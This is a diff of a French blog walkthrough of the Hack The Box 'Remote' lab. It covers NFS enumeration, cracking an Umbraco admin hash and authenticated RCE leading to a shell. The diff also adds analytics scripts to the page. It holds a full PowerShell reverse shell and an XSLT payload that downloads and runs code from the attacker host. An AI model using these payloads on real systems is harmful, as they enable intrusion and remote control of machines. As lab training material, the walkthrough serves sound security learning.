@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -28,8 +28,8 @@
 <meta property="og:description" content="Remote est une machine Windows considérée comme facile. Un partage NFS ouvert permet de récupérer les sources du site web en place et de récupérer le mot de passe administrateur. L&rsquo;accès utilisateur est récupéré au travers d&rsquo;une exécution de commande à distance sur le CMS &ldquo;Umbraco&rdquo;. L&rsquo;escalade de privilège exploite quand à elle le service &ldquo;UsoSvc&rdquo; afin de récupérer un accès administrateur." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/fr/walkthroughs/hackthebox/remote/" />
-<meta property="article:published_time" content="2020-09-06T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2020-09-06T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2020-09-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-09-06T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -52,6 +52,32 @@
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -170,7 +196,7 @@
       <a rel="alternate" href="/en/walkthroughs/hackthebox/remote/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -204,62 +230,58 @@
   </header>
   <div class="post">
     <p>Remote est une machine Windows considérée comme facile. Un partage NFS ouvert permet de récupérer les sources du site web en place et de récupérer le mot de passe administrateur. L&rsquo;accès utilisateur est récupéré au travers d&rsquo;une exécution de commande à distance sur le CMS &ldquo;Umbraco&rdquo;. L&rsquo;escalade de privilège exploite quand à elle le service &ldquo;UsoSvc&rdquo; afin de récupérer un accès administrateur.</p>
-
 <p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
-
-<h2 id="découverte-énumération">Découverte / Énumération</h2>
-
+<h2 id="découverte--énumération">Découverte / Énumération</h2>
 <p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
-
-<pre><code class="language-bash">Nmap scan report for 10.10.10.180
-Host is up (0.073s latency).
-Not shown: 9992 closed ports
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.180
+Host is up <span style="color:#f92672">(</span>0.073s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">9992</span> closed ports
 PORT      STATE SERVICE           VERSION
 21/tcp    open  ftp               Microsoft ftpd
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
 | ftp-syst: 
 |_  SYST: Windows_NT
-80/tcp    open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+80/tcp    open  http              Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
 | http-methods: 
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Home - Acme Widgets
-111/tcp   open  rpcbind           2-4 (RPC #100000)
+111/tcp   open  rpcbind           2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
 | rpcinfo: 
 |   program version   port/proto  service
-|   100000  2,3,4        111/tcp  rpcbind
-|   100000  2,3,4        111/udp  rpcbind
-|   100003  2,3         2049/udp  nfs
-|   100003  2,3,4       2049/tcp  nfs
-|   100005  1,2,3       2049/tcp  mountd
-|   100005  1,2,3       2049/udp  mountd
-|   100021  1,2,3,4     2049/tcp  nlockmgr
-|   100021  1,2,3,4     2049/udp  nlockmgr
-|   100024  1           2049/tcp  status
-|_  100024  1           2049/udp  status
+|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp  rpcbind
+|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp  rpcbind
+|   <span style="color:#ae81ff">100003</span>  2,3         2049/udp  nfs
+|   <span style="color:#ae81ff">100003</span>  2,3,4       2049/tcp  nfs
+|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/tcp  mountd
+|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/udp  mountd
+|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/tcp  nlockmgr
+|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/udp  nlockmgr
+|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/tcp  status
+|_  <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/udp  status
 135/tcp   open  msrpc             Microsoft Windows RPC
 139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds?
-2049/tcp  open  mountd            1-3 (RPC #100005)
-5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+2049/tcp  open  mountd            1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
+5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 10000/tcp open  snet-sensor-mgmt?
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
 TCP/IP fingerprint:
-OS:SCAN(V=7.70%E=4%D=3/22%OT=21%CT=1%CU=30779%PV=Y%DS=2%DC=I%G=Y%TM=5E7771A
-OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=103%TI=RD%CI=RD%II=I%TS=U)S
-OS:EQ(SP=100%GCD=1%ISR=103%TI=I%CI=RD%TS=U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%
-OS:O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3
-OS:=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y
-OS:%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%
-OS:F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y
-OS:%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%R
-OS:D=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%
-OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPC
-OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.70%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>3/22%OT<span style="color:#f92672">=</span>21%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>30779%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>5E7771A
+OS:5%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>100%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>103%TI<span style="color:#f92672">=</span>RD%CI<span style="color:#f92672">=</span>RD%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>S
+OS:EQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>100%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>103%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>RD%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M54DNW8NNS%O2<span style="color:#f92672">=</span>M54DNW8NNS%
+OS:O3<span style="color:#f92672">=</span>M54DNW8%O4<span style="color:#f92672">=</span>M54DNW8NNS%O5<span style="color:#f92672">=</span>M54DNW8NNS%O6<span style="color:#f92672">=</span>M54DNNS<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FFFF%W2<span style="color:#f92672">=</span>FFFF%W3
+OS:<span style="color:#f92672">=</span>FFFF%W4<span style="color:#f92672">=</span>FFFF%W5<span style="color:#f92672">=</span>FFFF%W6<span style="color:#f92672">=</span>FF70<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>FFFF%O<span style="color:#f92672">=</span>M54DNW8NNS%CC<span style="color:#f92672">=</span>Y
+OS:%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S%
+OS:F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y
+OS:%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%R
+OS:D<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%
+OS:S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPC
+OS:K<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%CD<span style="color:#f92672">=</span>Z<span style="color:#f92672">)</span>
 
-Network Distance: 2 hops
-TCP Sequence Prediction: Difficulty=256 (Good luck!)
+Network Distance: <span style="color:#ae81ff">2</span> hops
+TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
 IP ID Sequence Generation: Randomized
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
@@ -278,22 +300,15 @@ Completed NSE at 15:09, 0.00s elapsed
 Initiating NSE at 15:09
 Completed NSE at 15:09, 0.00s elapsed
 
-</code></pre>
-
-<h2 id="partages-nfs-et-code-source">Partages NFS et code source</h2>
-
+</code></pre></div><h2 id="partages-nfs-et-code-source">Partages NFS et code source</h2>
 <p>Première piste de recherche, le service ouvert derrière le port 2049. N&rsquo;ayant jusqu&rsquo;à maintenant jamais eu à faire à ce type de services, quelques recherches se sont imposées.
 Il s&rsquo;avère que ce port fait référence aux partages réseaux NFS. Il est également possible de monter ces partages depuis une machine Linux afin d&rsquo;y accéder.
 Pour information, depuis une machine Debian, il est nécessaire d&rsquo;installer le package <code>nfs-common</code>. Le montage se fait simplement avec la commande <code>mount</code>.
 N&rsquo;ayant eu aucune information au sujet du chemin, on tente de monter la racine du partage.</p>
-
-<pre><code class="language-bash">$ sudo mount -t nfs 10.10.10.180:/ TMPMOUNT
-</code></pre>
-
-<p>Ca passe ! Parfait, on se retrouve donc avec un répertoire <code>site_backup</code> contennant les sources de ce qui semble être un site web. Probablement le site qui tourne sur le port 80 découvert auparavant !
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo mount -t nfs 10.10.10.180:/ TMPMOUNT
+</code></pre></div><p>Ca passe ! Parfait, on se retrouve donc avec un répertoire <code>site_backup</code> contennant les sources de ce qui semble être un site web. Probablement le site qui tourne sur le port 80 découvert auparavant !
 De plus, les sources nous indiquent qu&rsquo;il s&rsquo;agit du CMS Umbraco.</p>
-
-<pre><code class="language-bash">$ cd TMPMOUNT 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cd TMPMOUNT 
 
 $ ls
 site_backups
@@ -301,14 +316,11 @@ site_backups
 $ cd site_backups 
 $ ls
 App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
-</code></pre>
-
-<p>À des fins de simplicité et facilité d&rsquo;utilisation, il est conseillé de copier le contenu du partage en local, afin d&rsquo;être plus tranquille pour l&rsquo;analyse.
+</code></pre></div><p>À des fins de simplicité et facilité d&rsquo;utilisation, il est conseillé de copier le contenu du partage en local, afin d&rsquo;être plus tranquille pour l&rsquo;analyse.
 Une fois cela fait, on peut commencer à chercher des informations. Disposant, des sources du site, on cherche notamment des fichiers de configuration ou des fichiers pouvant contenir des mots de passe.
 Quelques recherches rapides nous apprennent que les informations des comptes utilisateurs, sous Umbraco, sont stockées dans le fichier <code>Umbraco.sdf</code>.
 On identifie rapidement ce dernier dans le répertoire <code>App_Data</code>.</p>
-
-<pre><code class="language-bash">$ pwd
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ pwd
 xx/SITE_BACKUP/App_Data
 
 $ ls
@@ -316,12 +328,8 @@ cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
 
 $ file Umbraco.sdf 
 Umbraco.sdf: data
-</code></pre>
-
-<p>Le format de fichier n&rsquo;étant pas directement reconnu (à priori, il s&rsquo;agit d&rsquo;une sorte de base de données.) on va simplement utiliser la méthode &ldquo;Quick &amp; Dirty&rdquo; afin de chercher de l&rsquo;information, j&rsquo;ai nommé <code>strings</code> ! :D</p>
-
+</code></pre></div><p>Le format de fichier n&rsquo;étant pas directement reconnu (à priori, il s&rsquo;agit d&rsquo;une sorte de base de données.) on va simplement utiliser la méthode &ldquo;Quick &amp; Dirty&rdquo; afin de chercher de l&rsquo;information, j&rsquo;ai nommé <code>strings</code> ! :D</p>
 <p>Ceci dit.. Cette méthode fonctionne plutôt bien, puisqu&rsquo;on identifie rapidement, en début de fichier, les éléments qui nous intéressent !</p>
-
 <pre><code>$ strings Umbraco.sdf
 
 Administratoradmindefaulten-US
@@ -338,302 +346,252 @@ dAc0^A\pW
 (1&amp;a$
 &quot;q!Q
 [...]
-</code></pre>
-
-<p>Plusieurs comptes, dont le compte administrateur <code>admin@htb.local</code> ainsi qu&rsquo;un hash, à priori du mot de passe, au format SHA-1. Cet algorithme est plutôt connu et déconseillé aujourd&rsquo;hui de par son manque de robustesse. Plusieurs services en ligne proposent notamment de tenter la récupération d&rsquo;un mot de passe à partir d&rsquo;un hash, en comparant ce dernier à d&rsquo;énormes bases de données.
+</code></pre><p>Plusieurs comptes, dont le compte administrateur <code>admin@htb.local</code> ainsi qu&rsquo;un hash, à priori du mot de passe, au format SHA-1. Cet algorithme est plutôt connu et déconseillé aujourd&rsquo;hui de par son manque de robustesse. Plusieurs services en ligne proposent notamment de tenter la récupération d&rsquo;un mot de passe à partir d&rsquo;un hash, en comparant ce dernier à d&rsquo;énormes bases de données.
 S&rsquo;il s&rsquo;agit d&rsquo;un mot de passe faible, les chances de réussite sont fortes !</p>
-
 <p>C&rsquo;est ainsi qu&rsquo;on récupère un joli mot de passe :)</p>
-
-<pre><code class="language-bash">admin@htb.local
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin@htb.local
 baconandcheese
-</code></pre>
-
-<h2 id="remote-code-execution-et-shell-utilisateur">Remote Code Execution et shell utilisateur</h2>
-
+</code></pre></div><h2 id="remote-code-execution-et-shell-utilisateur">Remote Code Execution et shell utilisateur</h2>
 <p>Nous sommes maintenant en mesure de travailler sur le site web de la machine.
-Une passe rapide sur les différentes pages ne révèle rien d&rsquo;intéressant. Cependant, disposant des identifiants administrateurs, on file se connecter à l&rsquo;interface (<a href="http://10.10.10.180/umbraco">http://10.10.10.180/umbraco</a>).</p>
-
-<p>Pour la suite, ne connaissant pas le CMS, je suis allé voir existait des vulnérabilités connues et il s&rsquo;avère qu&rsquo;un exploit pour une exécution de commandes à distance a été publié l&rsquo;an dernier, en 2019 (<a href="https://www.exploit-db.com/exploits/46153">https://www.exploit-db.com/exploits/46153</a>).</p>
-
+Une passe rapide sur les différentes pages ne révèle rien d&rsquo;intéressant. Cependant, disposant des identifiants administrateurs, on file se connecter à l&rsquo;interface (http://10.10.10.180/umbraco).</p>
+<p>Pour la suite, ne connaissant pas le CMS, je suis allé voir existait des vulnérabilités connues et il s&rsquo;avère qu&rsquo;un exploit pour une exécution de commandes à distance a été publié l&rsquo;an dernier, en 2019 (<a href="https://www.exploit-db.com/exploits/46153)">https://www.exploit-db.com/exploits/46153)</a>.</p>
 <p>Le seul prérequis, que nous remplissons, est de disposer d&rsquo;un accès administrateur à l&rsquo;application.</p>
-
 <p>Le PoC présenté dans l&rsquo;exploit ouvre une calculatrice sur la machine ciblée. Cependant, dans notre cas, un reverse shell serait plus approprié ;).</p>
-
-<p>Deux variables sont ainsi utilisées :
-- proc.StartInfo.Filename pour le nom du binaire à exécuter ;
-- &ldquo;cmd&rdquo; afin de spécifier d&rsquo;éventuels arguments.</p>
-
+<p>Deux variables sont ainsi utilisées :</p>
+<ul>
+<li>proc.StartInfo.Filename pour le nom du binaire à exécuter ;</li>
+<li>&ldquo;cmd&rdquo; afin de spécifier d&rsquo;éventuels arguments.</li>
+</ul>
 <p>Deux façon de faire. On pourrait par exemple déposer un netcat sur la machine puis l&rsquo;exécuter afin de récupérer un shell, mais il également possible de passer par Powershell. C&rsquo;est cette dernière solution que j&rsquo;ai choisi d&rsquo;utiliser.</p>
-
 <p>On commence donc par récupérer un reverse shell Powershell. Pour ma part, j&rsquo;ai utilisé celui ci. Il s&rsquo;agit d&rsquo;un code plutôt simple et classique, que l&rsquo;on peut retrouver partout sur Internet.
 Les seuls éléments à adapter sont l&rsquo;adresse IP et le port.</p>
-
-<pre><code class="language-bash">$socket = new-object System.Net.Sockets.TcpClient('10.10.14.5', 5577);
-if($socket -eq $null){exit 1}
-$stream = $socket.GetStream();
-$writer = new-object System.IO.StreamWriter($stream);
-$buffer = new-object System.Byte[] 1024;
-$encoding = new-object System.Text.AsciiEncoding;
-do
-{
-  $writer.Flush();
-  $read = $null;
-  $res = &quot;&quot;
-  while($stream.DataAvailable -or $read -eq $null) {
-    $read = $stream.Read($buffer, 0, 1024)
-  }
-  $out = $encoding.GetString($buffer, 0, $read).Replace(&quot;`r`n&quot;,&quot;&quot;).Replace(&quot;`n&quot;,&quot;&quot;);
-  if(!$out.equals(&quot;exit&quot;)){
-    $args = &quot;&quot;;
-    if($out.IndexOf(' ') -gt -1){
-      $args = $out.substring($out.IndexOf(' ')+1);
-      $out = $out.substring(0,$out.IndexOf(' '));
-      if($args.split(' ').length -gt 1){
-                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
-                $pinfo.FileName = &quot;cmd.exe&quot;
-                $pinfo.RedirectStandardError = $true
-                $pinfo.RedirectStandardOutput = $true
-                $pinfo.UseShellExecute = $false
-                $pinfo.Arguments = &quot;/c $out $args&quot;
-                $p = New-Object System.Diagnostics.Process
-                $p.StartInfo = $pinfo
-                $p.Start() | Out-Null
-                $p.WaitForExit()
-                $stdout = $p.StandardOutput.ReadToEnd()
-                $stderr = $p.StandardError.ReadToEnd()
-                if ($p.ExitCode -ne 0) {
-                    $res = $stderr
-                } else {
-                    $res = $stdout
-                }
-      }
-      else{
-        $res = (&amp;&quot;$out&quot; &quot;$args&quot;) | out-string;
-      }
-    }
-    else{
-      $res = (&amp;&quot;$out&quot;) | out-string;
-    }
-    if($res -ne $null){
-        $writer.WriteLine($res)
-    }
-  }
-}While (!$out.equals(&quot;exit&quot;))
-$writer.close();
-$socket.close();
-$stream.Dispose()
-</code></pre>
-
-<p>Afin de pouvoir télécharger ce script depuis la cible, on va l&rsquo;héberger sur un serveur web temporaire. le module <code>http.server</code> de Python répond parfaitement à ce besoin.</p>
-
-<pre><code class="language-bash">$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-</code></pre>
-
-<p>Par la suite, on prépare notre payload afin d&rsquo;aller chercher le fichier ps1 et de l&rsquo;exécuter directement en mémoire. Bien entendu, il est également nécessaire de renseigner les identifiants du compte de l&rsquo;application.</p>
-
-<pre><code class="language-bash">payload = '&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; \
-xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; \
-xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;\
-&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() \
-{ string cmd = &quot;IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.14.5:8000/minireverse.ps1\')&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
- proc.StartInfo.FileName = &quot;powershell.exe&quot;; proc.StartInfo.Arguments = cmd;\
- proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
- proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
- &lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt;\
- &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; ';
-
-login = &quot;admin@htb.local&quot;;
-password=&quot;baconandcheese&quot;;
-host = &quot;http://10.10.10.180&quot;;
-
-</code></pre>
-
-<p>Une fois la totalité des éléments en place, on lance un netcat en écoute sur notre machine, puis on lance le script python d&rsquo;exploitation. Si tout fonctionne correctement, vous dévriez voir une requête <code>GET</code> passer dans les logs du serveur web.</p>
-
-<pre><code class="language-bash"># Shell 1
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$socket <span style="color:#f92672">=</span> new-object System.Net.Sockets.TcpClient<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;10.10.14.5&#39;</span>, 5577<span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$socket -eq $null<span style="color:#f92672">){</span>exit 1<span style="color:#f92672">}</span>
+$stream <span style="color:#f92672">=</span> $socket.GetStream<span style="color:#f92672">()</span>;
+$writer <span style="color:#f92672">=</span> new-object System.IO.StreamWriter<span style="color:#f92672">(</span>$stream<span style="color:#f92672">)</span>;
+$buffer <span style="color:#f92672">=</span> new-object System.Byte<span style="color:#f92672">[]</span> 1024;
+$encoding <span style="color:#f92672">=</span> new-object System.Text.AsciiEncoding;
+<span style="color:#66d9ef">do</span>
+<span style="color:#f92672">{</span>
+  $writer.Flush<span style="color:#f92672">()</span>;
+  $read <span style="color:#f92672">=</span> $null;
+  $res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+  <span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>$stream.DataAvailable -or $read -eq $null<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    $read <span style="color:#f92672">=</span> $stream.Read<span style="color:#f92672">(</span>$buffer, 0, 1024<span style="color:#f92672">)</span>
+  <span style="color:#f92672">}</span>
+  $out <span style="color:#f92672">=</span> $encoding.GetString<span style="color:#f92672">(</span>$buffer, 0, $read<span style="color:#f92672">)</span>.Replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;`r`n&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span>.Replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;`n&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span>;
+  <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!$out.equals<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;exit&#34;</span><span style="color:#f92672">)){</span>
+    $args <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+    <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$out.IndexOf<span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> -gt -1<span style="color:#f92672">){</span>
+      $args <span style="color:#f92672">=</span> $out.substring<span style="color:#f92672">(</span>$out.IndexOf<span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span>+1<span style="color:#f92672">)</span>;
+      $out <span style="color:#f92672">=</span> $out.substring<span style="color:#f92672">(</span>0,$out.IndexOf<span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">))</span>;
